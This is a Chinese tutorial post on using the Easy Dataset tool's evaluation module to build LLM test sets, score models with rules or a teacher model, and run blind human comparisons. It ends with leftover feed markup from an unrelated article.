<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a07537b47624439a38612a0b6d689d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=GdOHQ1UlNgcM0X8H%2Bl0USGEOA3Y%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>测试集难构造：和模型微调训练面临的问题一样，企业里有海量的 PDF 手册、Markdown 技术文档，但没有现成的 QA 对（问答对）。要评估模型，首先得把非结构化的文档变成结构化的测试集。</p>
</li>
<li>
<p>定性容易，定量难：大家常说“这个模型感觉比那个好”。但在工程上，“感觉”是不值钱的。我们需要具体的指标 — 是召回率提升了？还是幻觉率下降了？所以我们需要一套可量化的指标，并且可以直观的观测。</p>
</li>
<li>
<p>自动化与人工的割裂：完全靠人工测，测不动；完全靠脚本测，不准（尤其是长文本生成）。如何把 “自动化的规模” 和 “人工的精准” 结合起来，是一个普遍性难题。</p>
</li>
</ul>
<h2 data-id="heading-7">第二部分：实战篇</h2>
<p>在实战章节，我们将使用一款工具（<code>Easy Dataset</code>）解决以上痛点。</p>
<blockquote>
<p>Easy Dataset 是一个专为创建大型语言模型数据集而设计的应用程序。通过 Easy Dataset，你可以将领域知识转化为结构化数据集，兼容所有遵循 OpenAI 格式的 LLM API，使数据集构造过程变得简单高效：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset%2F" target="_blank" title="https://github.com/ConardLi/easy-dataset/" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a></p>
</blockquote>
<p>在，<code>Easy Dataset</code> 的 1.7.0 版本，支持了全新的 “评估” 模块，能够做到 <strong>自动化生成测试集</strong> + <strong>低成本的创建评估任务</strong> + <strong>可视化的评估结果</strong>。</p>
<h3 data-id="heading-8">1.评估数据集（测试集）生成</h3>
<blockquote>
<p><strong>评估数据集是什么？</strong></p>
<ul>
<li>评估数据集（测试集）是一组“题目 + 标准答案/参考答案 + 评分规则/选项”的集合。你可以用它来：做不同模型的对比评估，长期追踪效果变化。</li>
</ul>
</blockquote>
<h4 data-id="heading-9">题目类型</h4>
<p>一个好的模型评估数据集（测试集）是衡量模型真实能力的基石。在 <code>Easy Dataset</code> 中，评估集不仅仅是问题的集合，更是包含标准答案、考点标签和业务逻辑的综合知识库。</p>
<p>为了全面考察模型能力，我们设计了五种题型：</p>
<ul>
<li><strong>判断题：</strong>
这是最直接的。考察模型对核心事实是否搞混。比如文档里说“温度不能超过 100 度”，题目问“温度是否可以达到 105 度？”，能有效检测幻觉。</li>
<li><strong>单选题：</strong>
4个选项（A-D），单选答案 | 考察模型在干扰项下的知识提取和辨析能力。</li>
<li><strong>多选题：</strong>
多个选项，答案为字母数组（如 <code>["A", "C"]</code>） | 极具挑战性，漏掉一个信息点就选不对。</li>
<li><strong>简答题（短答案）：</strong>
提供标准短答案（20字以内），可测试模型获取核心知识点并精简表达的能力。如：2025 年美团的营收是多少亿？</li>
<li><strong>开放题（长答案）：</strong>
考察推理和总结能力。比如“根据文档描述，分析一下为什么会出现设备异响？”。这种题没有标准死答案，最考验模型的逻辑。</li>
</ul>
<p>并且，在任务配置中 <strong>支持配置各题目类型生成的比例</strong>（比如：我要 30% 的判断题用于测幻觉，70% 的简答题测理解）：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4caf47bc3d2d454c929f79a566ace467~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=iY%2Bvke5A8lT%2BeKtDKe8lY8Rp2ms%3D" alt="" loading="lazy"/></p>
<p>在 <code>Easy Dataset</code> 中，你可以通过多种方式生成和配置评估数据集（测试集）：</p>
<ul>
<li>从领域文献中提取测试集</li>
<li>从训练集添加或生成测试集变体</li>
<li>导入自定义/平台内置测试集</li>
</ul>
<h4 data-id="heading-10">从领域文献生成测试集</h4>
<p>不管是 PDF 还是 Docx 格式的领域文献，系统支持直接导入。后台会把这些长文本切分成小块（Chunk），然后通过提示词工程，让大模型基于这些文本块自动生成题目。</p>
<p>我们首先来到【数据源-文献处理】模块，导入一份小米 2025 Q3 季度的财报文档：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90562dd550c84b85a6946ee78125c6a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=AHYf6ZDksSDmAsYuMGGsMKcrW7s%3D" alt="" loading="lazy"/></p>
<p>系统解析完成后，会对文档进行自动切块，为了保证后续在文本块上生成的测试集更符合主题，我们批量编辑文本块：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54c9e8ffb19348699b70cf9756b0b38c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=7ZrydmqV2xzrV1C%2Bz%2Bv9Szjq0qg%3D" alt="" loading="lazy"/></p>
<p>在每个文本块的开头增加全局摘要信息：</p>
<blockquote>
<p>全局摘要：当前文本为 <strong>小米集团</strong> 2025 Q3 季度的财报文档的一部分。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab2aec2441f84ee2ab986481394a84bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=zI4XAXtW9Zf3nABmDArQ3kwJ9J0%3D" alt="" loading="lazy"/></p>
<p>然后，我们可以选择基于单个文本块生成测试集，或自动生成测试集（后台自动读取并处理未生成测试集的文本块），系统将根据我们前面在项目设置中设置的几种题目类型的比例自动生成测试题目（默认的题目类型判断题、单选题、多选题、简答题、开放题为 <code>1:1:1:1:1</code>）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bfe29455c2f482faf2aa9c72960257e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=38O7Sa%2FwAIk7XMvdO49GQL8cszM%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>建议：</p>
<ul>
<li>先用 “单个生成” 跑通流程，确认题型质量与期望一致，在执行自动生成任务。</li>
<li>比例配置先从保守开始：开放题比例不要太高（后续教师模型评估成本更高）</li>
</ul>
</blockquote>
<h4 data-id="heading-11">测试题管理</h4>
<p>点击每个文本块上的 <strong>已生成测试题</strong> 标签，我们将跳转至【评估-评估数据集】模块，在这里你可以看到已经生成的所有数据集，你可以根据题目类型、题目内容和标签进行筛选：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47463c166c3e4f2e98f879ccaa8a9c01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=DGPOrlZm1l27TydSuV5UjqedZOo%3D" alt="" loading="lazy"/></p>
<p>点击单个题目，可以查看题目详情：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54881f7c153e48798b7af126dc9d1a80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=cgH9SPYF5gQ3u6lQeZPB8h1EEp8%3D" alt="" loading="lazy"/></p>
<p>问题、选项、答案都可以自由编辑，你也可以对题目进行打标签、备注、删除等等：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/601f7268a08c4162aae0a03954caf8b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=Hf9S4DEsIANWf1C0%2BiI0p6OXJYQ%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">从数据集添加</h4>
<p>在以前的项目中，你可能已经使用  <code>Easy Dataset</code> 生成过数据集（训练集），我们也支持直接从已有数据集上标注和生成测试集。</p>
<p>下面我们来到【数据集-单论问答数据集】模块，可以看到之前生成过的数据集：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab7f5c6b253847b6b2cb2029e73953f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=LJXud%2BgUF6YYSgoBIKx0IUgW8W0%3D" alt="" loading="lazy"/></p>
<p>进入数据集详情页，我们可以直接将当前数据集添加到评估数据集（测试集），同时，系统给原数据集打上 Eval 标签（用于后续筛选/识别）：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a1bd7191b4e4847873538eca6f50a2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=I5M%2FqOumePsJevUG4CjelNgzbzs%3D" alt="" loading="lazy"/></p>
<p>如果训练集太少或多样性不足，模型有时候会 “死记硬背”。我们也可以把一道现有的数据集题目自动改写生成评估集变体（比如换个问法，或者把选择题改成判断题），看看模型是不是真的理解了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9f4928ed4fd4edb9d152f49aa5321fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=R6N5K11DTLnLoc2Njz8ftdi%2Bb1M%3D" alt="" loading="lazy"/></p>
<p>点击：【生成评估集变体】可以选择要生成的题目类型和数量：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a87b5c66261343e592fe59438650a671~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=PqxrxZdqRpQRlrFuznt%2FVK0LUU4%3D" alt="" loading="lazy"/></p>
<p>在常规的思路中，一般我们要从所有数据集中划分出一定比例（如 15%）作为测试集。</p>
<p>但是，在小规模的数据集上，如果直接划分出一定比例的测试集可能会导致原有的训练集数量和多样性不足，导致模型训练效果差。</p>
<p>如果使用 <code>Easy Dataset</code> 生成的数据集，我们可以全部用于训练集，另外一部分测试集我们可以直接在现有的数据集上生成变体，或重新从文本块提取。这样既能保证训练集的多样性不会受到损失，还能保证有足够丰富的测试集来支撑最终模型效果的评估。</p>
<h4 data-id="heading-13">导入导出测试集</h4>
<p>如果你已经有准备好的测试集，只是想使用 <code>Easy Dataset</code> 来做评估任务，可以到【评估-评估数据集】模块直接进行导入：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d4720bd8e1f49efa79e7083ab1308ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=0ehA3YwrkJQbLbq9AfqSn%2F5lZDc%3D" alt="" loading="lazy"/></p>
<p>目前支持从 <code>JSON、XLS、XLSX</code> 几种类型的文件进行导入，需要将文件处理成规定格式：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f3e3893fc554dfb841e3f596d8e6df0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=u4oHme5Z%2F9txz78y9w9xjCy7jaU%3D" alt="" loading="lazy"/></p>
<p>你可以直接下载对应题型和文件类型的模版，然后按照模版进行补充：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae275ad3b906470f8c1d009669ebe36e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=cfRU9Wjt8%2Fys8hAua367%2F9GwvpM%3D" alt="" loading="lazy"/></p>
<p>另外，平台还内置了丰富的领域知识数据集，如果你想测试模型在特定领域下的表现，可以直接选择【导入内置数据集】并选择对应学科进行导入：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32778826ddc7415c948c69d6575eaa48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=mf%2FVaB8vUlPXhk2iEzwLFYTaslo%3D" alt="" loading="lazy"/></p>
<p>每个学科下都内置了几百道不同难度的题目（大部分为单选或多选题）：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c96570a3a764814bbcb3e1006e6e5f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=0Bfp%2BsL2g5Qpjy%2Fqi%2FgnyK07CoE%3D" alt="" loading="lazy"/></p>
<p>测试集处理完成后，我们也可以直接进行导出（支持自定义导出范围和格式），你可用于其他评估系统：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e1d4e7954c943acb85bb527b8db94f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=2IRLLCEVB1fWrD9yo2yqDAxIhn4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">2. 怎么打分？（自动评估任务）</h3>
<p>题出好了，接下来就是让业务模型来做题，系统来判卷。系统支持两种阅卷模式：</p>
<h4 data-id="heading-15">模式一：直接计算得分（针对客观题）</h4>
<p>对于<strong>判断题、单选题、多选题</strong>，答案是唯一的。
系统不需要调用大模型，直接用规则代码比对。</p>
<p>我们来到【评估-自动评估任务】模块，点击创建任务，您可以同时勾选多个模型，系统会并发执行多个任务：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/418f1e4b15ad41268dca5088351da9ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=FBUHmgA%2BuhuPNmxqtBLDSfesKZE%3D" alt="" loading="lazy"/></p>
<p>就像要真实要对模型进行一场考试一样，我们可以配置本次 “考卷” 的具体题目范围：</p>
<ul>
<li><strong>题型筛选</strong>：比如本次之考察选择题和判断题。</li>
<li><strong>标签筛选</strong>：比如只考查标签为 <code>医疗知识</code> 的题目。</li>
<li><strong>动态采样</strong>：如果您想快速获得结果，可以从 1000 道题中随机抽样 50 道。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce8d7497beb740cb8abd475537c55ccc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=u32ZtfMpZDNW0I7OBrxbQEMK%2FEU%3D" alt="任务执行中" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79a68f82299141ab9ec1e4d50eec1351~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=yfhUR2HJIY9Kgh70hzDlmJt792o%3D" alt="任务执行完成" loading="lazy"/></p>
<p>进入评估任务详情，你可以看到模型在不同题目上的具体得分情况，我们可以根据题目回答结果（正确/错误）以及题目类型（判断、单选、多选）进行筛选：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56629816f35b4a5ba2b001c4ebafb7fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=gIGcBjTtGGN%2BVQbVvcVKjEPFdOI%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-16">模式二：教师模型评估（针对主观题）</h4>
<p>对于客观题（选择、判断），系统可以自动对齐答案。但对于 <strong>简答题</strong> 和 <strong>开放题</strong>，答案往往是多样化的。我们可以选择一个更智慧的 “教师模型”（就像判断老师一样） 对测试模型的回答进行深度评测，给出量化的分数和定性的评语。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/312f4c8f116a4654905c19c10b0815fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=OCdaAlZ8CKyD6e7nMESfw84k%2BNM%3D" alt="" loading="lazy"/></p>
<p>系统内置了一份评分标准，不过通用的标准比较宽泛，不一定适用于所有场景，如果你想得到更准确的评估结果，建议根据实际业务场景和数据集的特点定制具体的评分规则：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b274baae7064d57a18e11eb36f81fb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=QCPVvyQRBoNCkhzbr%2FA2%2Bjd6D6g%3D" alt="" loading="lazy"/></p>
<p>在评估报告详情中，你可以看到每个题目的具体得分，教师模型的打分以及具体的打分理由：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33f31315d0414e32893fa59a1c7ff815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=mKF70N1TjWPegx%2FTDVEotWOAxEI%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>建议：</p>
<ul>
<li>同一套评估长期对比时，尽量固定教师模型与评分配置，否则分数不可直接横向对比</li>
<li>先在小样本（如 20 题）跑通，确认裁判标准符合预期，再扩大规模</li>
</ul>
</blockquote>
<h3 data-id="heading-17">3. 人工盲测：回归真实直觉的 “竞技场”</h3>
<p>虽然自动化评估很方便，但在模型上线的最后阶段，或者两个模型分数咬得很死的时候，还是需要人来看一眼。</p>
<blockquote>
<p><strong>盲测任务是什么？</strong></p>
<ul>
<li>盲测任务 = 把多个模型的回答“匿名化”，让评审者只看回答质量做选择/打分</li>
<li>适合：
<ul>
<li>你希望排除“模型名偏见”</li>
<li>你更在意主观体验（可读性、风格、说服力、完整性等）</li>
<li>开放题/对话型内容的最终质量评估</li>
</ul>
</li>
</ul>
</blockquote>
<p>就像在上个章节中我们讲到到 <code>LMArena</code>，人工盲测对于垂直领域的模型评估同等重要，在实际测试中，系统会隐藏两个模型的回答结果，评判者仅根据回答的质量、逻辑、语气进行主观判断，彻底消除对特定品牌的固有偏见。</p>
<p>我们来到【评估-人工盲测任务】模块，然后点击创建任务，然后配置：</p>
<ul>
<li><strong>两两对比</strong>：从模型库中选择两个你最想对比的模型。</li>
<li><strong>题目范围</strong>：选择简答题或开放题并设置抽样数量。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a285420962c456898a224517afe4637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=Ygmq4EgT76Cfelwmy0nE6bLzip4%3D" alt="" loading="lazy"/></p>
<p>任务开启后，您将进入一个类似 <strong>Chatbot Arena</strong> 的沉浸式的对比界面：</p>
<ul>
<li><strong>左右对照</strong>：左边展示候选 A 的回答，右边展示候选 B 的回答，但不告诉标注人员具体是哪个模型。</li>
<li><strong>流式加载</strong>：系统支持流式输出，您可以实时看到模型的生成过程。</li>
<li><strong>四选一投票</strong>：标注人员只需要根据直观感受，选择“左边好”、“右边好”或者“平局”。
<ul>
<li><strong>👈 左边更好</strong>：左侧回答在准确性、流畅度或安全性上更优。</li>
<li><strong>👉 右边更好</strong>：右侧回答更符合你的预期。</li>
<li><strong>🤝 平局</strong>：两者难分伯仲，或都存在明显的严重错误。</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c547fb0ce7b34e45ac5571c2f5826283~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=6aBpZxSeH7kH%2Fi1vWAktb6DMMi8%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>这种 Side-by-Side 的比较数据，是目前公认最符合人类真实体感的评估方式。</p>
</blockquote>
<p>当所有题目投票完成后，系统会 “揭晓谜底” 并生成胜率统计，系统将展示每个模型在对比中获胜的百分比。如果平局较多，说明这两个模型在当前题库下的表现非常接近。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b4b6f87ce4a4acca5c93370e4df418d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=2uiIcrN1RBn6zCHf%2F5pRAChldf4%3D" alt="" loading="lazy"/></p>
<p>你还可以回顾具体某个题目的回答结果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79e1b67cd96f458bbc4ed348d89b88b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=oT6dZMGZXMmUw9quD6UhvERQEwU%3D" alt="" loading="lazy"/></p>
<p>回到任务列表，我们能清晰的看到每次盲测任务的结果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30fb91c3cdd6477eb1d8d691a0c16ed5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=J0vetIzt7%2BzZFpsfpWkmeqe0Lx8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">4. 高级用法：自定义评估</h3>
<p>如果你有更定制化的模型评估需求（如需要定制处理的风格和侧重点、希望教师模型更关注某些特定维度），可以到【更多-项目设置-提示词配置模型】对模型评估的提示词进行更改，系统全面开放了评估系统的全套提示词，包括：</p>
<ul>
<li>从领域文献生成测试集的提示词：判断题、单选题、多选题、简答题、开放问题的生成</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95cfa6f145294b40b075218d0cc3513f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=nPwAeQdzjgV1etNYKsJIRN8JVxM%3D" alt="" loading="lazy"/></p>
<ul>
<li>不同题目执行测评的提示词：从原始题目获取答案</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99912934edb04fb7ab1319a01d33a5e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=P1iXgr%2BLV1X%2Bs3AHU3peCxjLaKo%3D" alt="" loading="lazy"/></p>
<ul>
<li>LLM 评估提示词：包括简答题和开放问题的评估</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6bddf44817b4e8389f0e515f631d79c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=v2J2tU1p7ju3OR7iueeVqNNzs5o%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>具体的评分细则在创建任务中是可以配置的，实际影响的就是提示词中的 <code>{{scoreAnchors}}</code> 变量，在这里的设置可以直接覆盖这个变量，自由度更高。</p>
</blockquote>
<h2 data-id="heading-19">最后</h2>
<p>希望阅读完本期教程，你将学会以下内容：</p>
<ol>
<li>理解通用基准在垂直领域的局限性，明确评估的三大核心目标（选型验证、微调效果、RAG优化）</li>
<li>掌握三类垂直领域评估方法的适用场景（确定性评估、文本相似度评估、LLM as Judge）</li>
<li>学会多方式构建垂直领域评估测试集（文献提取、训练集转化、自定义导入）</li>
<li>掌握客观题规则判分、主观题教师模型打分的自动化评估方法</li>
<li>能设计并执行人工盲测任务，获取贴合实际体感的模型对比结果</li>
<li>可通过自定义提示词适配不同垂直领域的评估需求</li>
<li>建立“测试集构建—自动化评估—人工验证”的评估闭环，实现模型效果量化判断</li>
</ol>
<p>关注《code秘密花园》从此学习 AI 不迷路，相关链接：</p>
<ul>
<li>Easy Dataset：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset" target="_blank" title="https://github.com/ConardLi/easy-dataset" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a></li>
<li>AI 教程完整汇总：<a href="https://link.juejin.cn?target=https%3A%2F%2Frncg5jvpme.feishu.cn%2Fwiki%2FU9rYwRHQoil6vBkitY8cbh5tnL9" target="_blank" title="https://rncg5jvpme.feishu.cn/wiki/U9rYwRHQoil6vBkitY8cbh5tnL9" ref="nofollow noopener noreferrer">rncg5jvpme.feishu.cn/wiki/U9rYwR…</a></li>
<li>相关学习资源汇总在：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-learn-ai" target="_blank" title="https://github.com/ConardLi/easy-learn-ai" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a></li>
</ul>
<p>如果本期对你有所帮助，希望得到一个免费的三连，感谢大家支持</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Shell入门指南]]></title>    <link>https://juejin.cn/post/7594661351514259491</link>    <guid>https://juejin.cn/post/7594661351514259491</guid>    <pubDate>2026-01-14T01:42:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594661351514259491" data-draft-id="7594667893017034767" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Shell入门指南"/> <meta itemprop="keywords" content="全栈,自动化运维"/> <meta itemprop="datePublished" content="2026-01-14T01:42:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="lihouyi"/> <meta itemprop="url" content="https://juejin.cn/user/4365493763322599"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta 